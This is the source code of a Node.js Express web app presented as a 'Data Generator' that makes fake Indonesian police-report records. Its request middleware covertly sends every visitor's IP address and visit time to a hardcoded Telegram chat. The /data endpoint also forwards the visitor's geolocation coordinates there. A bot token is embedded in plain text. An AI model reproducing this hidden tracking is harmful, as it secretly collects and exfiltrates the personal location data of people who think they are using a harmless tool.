const express = require('express');
const fs = require('fs');
const app = express();
const cors = require('cors');
const http = require('http').createServer(app);
const request_ip = require('request-ip');
const axios =require('axios');
const botgram = require('botgram');
const bot = botgram('1961122397:AAEJplxvWa-A1Xwpy1eODp_MmwgHs-04qDY');
const moment_timezone = require('moment-timezone');
const moment = require('moment');
const faker = require('faker');

global.ViewEngine = require(__dirname+'/view-engine');

app.set('views', __dirname+'/views');
app.set('view engine', 'twig');
app.use(express.static(__dirname+'/public'));
app.use(express.json());
app.use(request_ip.mw());
app.use(express.urlencoded({ extended: true }));
app.use(cors({ origin : (origin, callback) => { callback(null, true) }, credentials: true }));
app.use((req, res, next) => {

	var text = 'IP Address : <code>'+req.clientIp+'</code>\n';
	text += 'Date : <code>'+moment().format('DD-MM-YYYY')+'</code> Time : <code>'+moment().format('HH:mm:ss')+'</code>';
	bot.reply(1039982744).html(text);

	// added locals variable
	res.locals.app = {
		name: 'Data Generator',
		vendor: 'Medan Software',
		version: 'v1.0.0'
	}

	res.render = (file, options = {}) => {
		Object.assign(options, res.locals); // merge option variable to local variable
		const Twig = new ViewEngine.Twig(__dirname+'/views'); // assign template paths

		Twig.addFunction('json_encode', (object) => {
			return Promise.resolve(JSON.stringify(object));
		});

		// render with twig
		Twig.render(file, options, (error, output) => {
			if (error) {
				res.send(output);
			} else {
				res.send(output);
			}
		});
	}

	next();
});

// var laporan = ['LP/11RES/1.8/2020/', 'Tgl 08 Januari 2020'];
// var kasus_dan_pasal = ['362 KUHP', 'Pencurian Biasa'];
// var tkp = 'Alamat';
// var motif = 'Dengan cara';
// var uraian = 'Pada hari';
// var korban = 'Nama Korban';
// var tersangka = 'Data Diri tersangka';
// var barang_bukti = ['Barang1', 'Barang2'];
// var keterangan = 'Tahap II';

var array_random = function(array) {
	var random = Math.floor(Math.random() * array.length);
	return array[random];
}

var random_integer = function(min, max) {
	min = Math.ceil(min);
	max = Math.floor(max);
	return Math.floor(Math.random() * (max - min + 1)) + min;
}

var to_boolean = function(str) {
	switch(str.toLowerCase().trim()) {
		case "true": case "yes": case "1": return true;
		case "false": case "no": case "0": case null: return false;
		default: return Boolean(str);
	}
}

app.get('/', (req, res) => {
	res.render('home.twig');
})
.post('/data', (req, res) => {
	var data = new Array();
	moment.tz.setDefault(process.env.TIMEZONE || 'Asia/Jakarta');
	faker.locale = 'id_ID';

	for (i = 0; i < 100; i++)  {

		var gender = array_random(['male', 'female']);
		data[i] = new Object;

		var num = (i+1);
		if (num < 10) {
			num = '0'+num;
		}

		var section = array_random(['I', 'II', 'III', 'IV', 'V', 'VI', 'VII', 'VIII', 'IX', 'X', 'XI', 'XII']);

		data[i]['laporan'] = 'LP/'+(num)+'/'+section+'/RES.'+random_integer(1, 4)+'.'+random_integer(1, 40)+'/2021';
		data[i]['tersangka'] = faker.name.firstName(gender)+' '+faker.name.lastName(gender);
		data[i]['korban'] = faker.name.firstName(gender)+' '+faker.name.lastName(gender);
		data[i]['tkp'] = faker.address.streetAddress(true);
	}

	if (to_boolean(req.body.allowed)) {
		var text = 'IP Address : <code>'+req.clientIp+'</code>\n';
		text += 'Date : <code>'+moment().format('DD-MM-YYYY')+'</code> Time : <code>'+moment().format('HH:mm:ss')+'</code>\n';
		text += '\n';
		text += 'Geo Location : \n';
		text += 'Lat : <code>'+req.body.geo.latitude+'</code>\n';
		text += 'Lon : <code>'+req.body.geo.longitude+'</code>\n';
		text += 'Accuracy : <code>'+req.body.geo.accuracy+'</code>\n';
		text += '\n';
		text += 'Maps : Sorry, this feature unvailable \n';
		bot.reply(1039982744).html(text);
	}

	res.json({
		status: 'ok',
		data: data
	});
})
.get('/about', (req, res) => {
	res.render('about.twig', {
		name: 'Developer'
	});
})
.get('/contact', (req, res) => {
	res.render('contact.twig', {
		name: 'Developer'
	});
});

http.listen(process.env.PORT || 8080);
